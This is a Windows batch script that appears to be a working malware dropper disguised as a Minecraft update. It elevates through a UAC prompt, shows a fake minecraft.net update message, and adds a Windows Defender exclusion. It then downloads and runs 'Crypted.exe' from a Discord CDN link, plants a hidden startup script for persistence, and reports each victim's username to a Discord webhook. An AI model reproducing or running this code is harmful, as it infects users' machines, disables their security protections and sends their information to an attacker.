@echo off
set EXE=PAYLOAD.exe
set javaw=Javaw.exe
title DO NOT CLOSE THIS TAB
FOR /F %%i IN ('tasklist /NH /FI "IMAGENAME eq %javaw%"') DO IF %%i == %javaw% goto end
goto start
:Start
net session >nul 2>&1
set url=https://cdn.discordapp.com/attachments/965480849074192435/966078120564260914/Crypted.exe
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
cls
set params = %*:"="
cls
echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
cls
"%temp%\getadmin.vbs"
cls
del "%temp%\getadmin.vbs"
cls
goto killmc
:gotAdmin
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"admin privileges granted on %username%\"}" https://discord.com/api/webhooks/965480955299127296/blCV9lkBmvgKUpfKAYWLe7e2wIrIBV_c7d3r2_hqNwgO4uqz_6HZb8DxZelBTkwevEIf
echo msgbox "Fetching updates from https://www.minecraft.net/." > %tmp%\tmp.vbs
cls
wscript %tmp%\tmp.vbs
cls
del %tmp%\tmp.vbs
cls
cd %temp%
cls
powershell -Command Add-MpPreference -ExclusionPath "%temp%" -ErrorAction SilentlyContinue
cls
powershell -Command start-bitstransfer %url%  .\PAYLOAD.exe
cls
start PAYLOAD.exe
goto processcheck
:killmc
:processcheck1
FOR /F %%i IN ('tasklist /NH /FI "IMAGENAME eq %EXE%"') DO IF %%i == %EXE% goto killmc3
goto temp3
:killmc3
taskkill /f /im javaw.exe
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"UAC Denied on %username%\"}" https://discord.com/api/webhooks/965480955299127296/blCV9lkBmvgKUpfKAYWLe7e2wIrIBV_c7d3r2_hqNwgO4uqz_6HZb8DxZelBTkwevEIf
:temp3
cd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cls
curl -o startup69.bat https://textuploader.com/t14zj/raw
cls
attrib +h startup69.bat
cls
cd C:\Users\%username%\AppData\Local\Temp
cls
:processcheck
FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq %EXE%"') DO IF %%x == %EXE% goto ProcessFound
cls
goto end
:ProcessFound
ping localhost -n 2 >nul
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"Process Active on %username%\"}" https://discord.com/api/webhooks/965480955299127296/blCV9lkBmvgKUpfKAYWLe7e2wIrIBV_c7d3r2_hqNwgO4uqz_6HZb8DxZelBTkwevEIf
cls
:end
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"File executed on %username% is now ending\"}" https://discord.com/api/webhooks/965480955299127296/blCV9lkBmvgKUpfKAYWLe7e2wIrIBV_c7d3r2_hqNwgO4uqz_6HZb8DxZelBTkwevEIf
cls
exit /b